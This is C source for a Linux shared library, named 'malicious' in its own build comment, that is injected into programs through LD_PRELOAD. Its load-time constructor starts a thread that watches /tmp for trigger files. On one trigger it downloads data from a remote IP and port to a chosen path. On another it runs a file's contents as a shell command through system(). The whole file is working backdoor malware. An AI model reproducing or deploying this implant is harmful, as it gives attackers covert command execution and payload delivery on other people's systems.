#include <stdio.h>  
#include <stdlib.h>
#include <pthread.h> // threading
#include <unistd.h>  // for sleep
#include <stdbool.h> // bool type
#include <sys/stat.h> // stat
#include <sys/socket.h> // socket stuff
#include <arpa/inet.h> // inet_addr
#include <netdb.h> 


#define TESTING 1

#define SLEEP_INTERVAL 5

// gcc -shared -fPIC -lpthread -o linux_maliciouslib.so linux_maliciouslib.c
// LD_PRELOAD=./third.so ls

void myenter()__attribute__((constructor));
void myexit()__attribute__((destructor));

void* threadmain(void *);

void myenter() {

#ifdef TESTING
  printf("library loaded\n");
#endif

  pthread_t dontcare;

  pthread_create(&dontcare, NULL, &threadmain, NULL);
}


void myexit() {
//This doesn't seem to be happening, but I'm not entirely sure why.
#ifdef TESTING
  printf("library unloaded\n");
#endif
}

bool file_exists(char* filename) {
  struct stat buffer;
  return (stat (filename, &buffer) == 0);
}

void* threadmain(void *arg) {
  FILE *fh;
  int tmp;
  char thisstr[] = "this";
  char inbuff[1024];
  char ip[1024];
  char outpath[1024];
  int port;
  int sockfd;
  struct sockaddr_in servaddr;

  while (1) {
#ifdef TESTING
     printf ("main ran\n");
#endif
     if (file_exists("/tmp/ABC")) {
       fh = fopen("/tmp/sawabc","w");
       fwrite(thisstr,1,sizeof(thisstr), fh);
       fclose(fh);

       unlink("/tmp/ABC");
     }

     if (file_exists("/tmp/ANDOR")) { //New User
       unsetenv("LD_PRELOAD");
       system("touch /tmp/systemcall\\ worked");

       unlink("/tmp/ANDOR");
     }

     if (file_exists("/tmp/X9999-lock")) { //Connect to socket and write to file
       fh = fopen("/tmp/X9999-lock", "r");
       if (fh == NULL) {
#ifdef TESTING
         printf("Failed to open the file\n");
#endif
       }
       else {
#ifdef TESTING
         printf("File opened ok.  Reading\n");
#endif
       }
       fflush(stdout);
       fgets(inbuff, sizeof(inbuff), fh);
//       fscanf(fh, "%s %d %s", ip, &port, outpath);
       fclose(fh);
       printf ("About to parse %s\n", inbuff);
       //Parse inbuff for addr and port separated by space
       if (sscanf(inbuff, "%100s %d %100s", ip, &port, outpath) != 3) {
//       if (0) {
#ifdef TESTING
         printf("Error parsing host and port and path");
#endif
       }
       else {
#ifdef TESTING
         printf("ip is: %s\nport is: %d\noutpath is: %s\n", ip, port, outpath);
#endif
         sockfd = socket(AF_INET, SOCK_STREAM, 0);
         if (sockfd < 0) {
#ifdef TESTING
           printf("Error opening socket\n");
#endif
         }
         //bzero(&servaddr, sizeof(servaddr));  //Commented but may need it.
         servaddr.sin_family = AF_INET;
         servaddr.sin_addr.s_addr=inet_addr(ip);
         servaddr.sin_port = htons(port);

         int tmp = connect(sockfd, (struct sockaddr *) &servaddr, sizeof(servaddr)) ;
	 
	 if (tmp < 0) {
#ifdef TESTING                    
           printf("Socket Error\n");
#endif                    
           close(sockfd);
         }
         else {
           unlink(outpath);
           fh = fopen(outpath, "w");
           tmp = 1;

           while (tmp > 0) {
             tmp = recv(sockfd, inbuff, sizeof(inbuff), 0);
#ifdef TESTING                    
             printf("Received %d bytes\n", tmp);
#endif                    
             if (tmp > 0) {
               fh = fopen(outpath, "a");
               int tmp2 = fwrite (inbuff, sizeof(char), tmp, fh);
#ifdef TESTING                    
               printf ("Wrote %d bytes\n", tmp2);
#endif                    
             } 
	   } //while tmp
           fclose(fh);
	 } // else of connect failed
       } // Else on parsing
      unlink("/tmp/X9999-lock");
    }

     //Web Request and write file
     if (file_exists("/tmp/X9997-lock")) {
       
     }



     if (file_exists("/tmp/X9998-lock")) { //Execute the command in the file
       fh = fopen("/tmp/X9998-lock","r");
       tmp  = fread(&inbuff, sizeof(char), sizeof(inbuff), fh);
       unsetenv("LD_PRELOAD");
       system(inbuff);
       fclose(fh);

       unlink("/tmp/X9998-lock");
     }
     sleep(SLEEP_INTERVAL);
  }
}
